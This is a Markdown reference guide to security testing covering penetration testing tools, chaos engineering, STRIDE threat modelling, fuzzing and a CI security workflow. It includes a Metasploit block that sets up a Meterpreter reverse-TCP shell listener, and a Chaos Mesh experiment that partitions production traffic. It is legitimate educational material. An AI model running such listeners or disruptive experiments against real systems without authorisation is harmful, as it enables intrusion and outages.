# Security Testing

Penetration testing, security chaos engineering, threat modeling, fuzz testing, and security test automation.

## Table of Contents

- [Penetration Testing](#penetration-testing)
- [Security Chaos Engineering](#security-chaos-engineering)
- [Threat Modeling](#threat-modeling)
- [Fuzz Testing](#fuzz-testing)
- [Security Test Automation](#security-test-automation)

## Penetration Testing

### Types

**Black Box:** No internal knowledge
**White Box:** Full system knowledge
**Gray Box:** Partial knowledge

### Tools

**OWASP ZAP:**
```bash
# Automated scan
docker run -t owasp/zap2docker-stable zap-baseline.py \
  -t https://example.com \
  -r report.html

# Full scan
docker run -t owasp/zap2docker-stable zap-full-scan.py \
  -t https://example.com
```

**Burp Suite:**
```bash
# Professional automated scanning
burp-scanner --url=https://example.com \
  --report=burp-report.html
```

**Metasploit:**
```bash
msfconsole
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 192.168.1.100
set LPORT 4444
exploit
```

## Security Chaos Engineering

### Principles

1. **Assume breach:** System already compromised
2. **Test defenses:** Verify detection and response
3. **Controlled experiments:** Measured impact
4. **Continuous testing:** Regular security drills

### Implementation

**Attack Simulation:**
```yaml
# chaos-mesh experiment
apiVersion: chaos-mesh.org/v1alpha1
kind: NetworkChaos
metadata:
  name: simulate-attack
spec:
  action: partition
  mode: all
  selector:
    namespaces:
      - production
    labelSelectors:
      app: database
  duration: "5m"
  direction: to
  target:
    mode: all
    selector:
      namespaces:
        - production
      labelSelectors:
        app: api
```

## Threat Modeling

### STRIDE Framework

- **S**poofing
- **T**ampering
- **R**epudiation
- **I**nformation Disclosure
- **D**enial of Service
- **E**levation of Privilege

### Example

```yaml
# threat-model.yaml
application: payment-api
assets:
  - credit_card_data
  - user_credentials
  - transaction_history

threats:
  - id: T001
    category: Information Disclosure
    description: Unauthorized access to credit card data
    likelihood: medium
    impact: critical
    mitigations:
      - Encryption at rest (AES-256)
      - TLS 1.3 in transit
      - Access logging
      - Data masking in logs

  - id: T002
    category: Elevation of Privilege
    description: Container escape to host
    likelihood: low
    impact: critical
    mitigations:
      - Non-root containers
      - seccomp profiles
      - AppArmor/SELinux
      - Pod Security Standards
```

## Fuzz Testing

### AFL (American Fuzzy Lop)

```bash
# Install AFL
sudo apt-get install afl

# Compile program with AFL
afl-gcc -o program program.c

# Run fuzzer
afl-fuzz -i input_dir -o output_dir ./program @@
```

### libFuzzer

```cpp
// fuzz_target.cc
#include <cstdint>
#include <cstddef>

extern "C" int LLVMFuzzerTestOneInput(const uint8_t *Data, size_t Size) {
  // Your code to test
  ParseInput(Data, Size);
  return 0;
}
```

```bash
# Compile and run
clang++ -g -fsanitize=fuzzer fuzz_target.cc -o fuzzer
./fuzzer corpus/
```

## Security Test Automation

```yaml
# .github/workflows/security-tests.yml
name: Security Tests

on:
  schedule:
    - cron: '0 2 * * 0'  # Weekly
  workflow_dispatch:

jobs:
  pentest:
    runs-on: ubuntu-latest
    steps:
      - name: OWASP ZAP Scan
        uses: zaproxy/action-baseline@v0.7.0
        with:
          target: ${{ secrets.STAGING_URL }}

  chaos:
    runs-on: ubuntu-latest
    steps:
      - name: Security Chaos Test
        run: |
          kubectl apply -f chaos/attack-simulation.yaml
          sleep 300
          kubectl logs -l app=monitoring | grep "ALERT"
```

---

**Related Resources:**
- [security-scanning.md](security-scanning.md)
- [security-monitoring.md](security-monitoring.md)
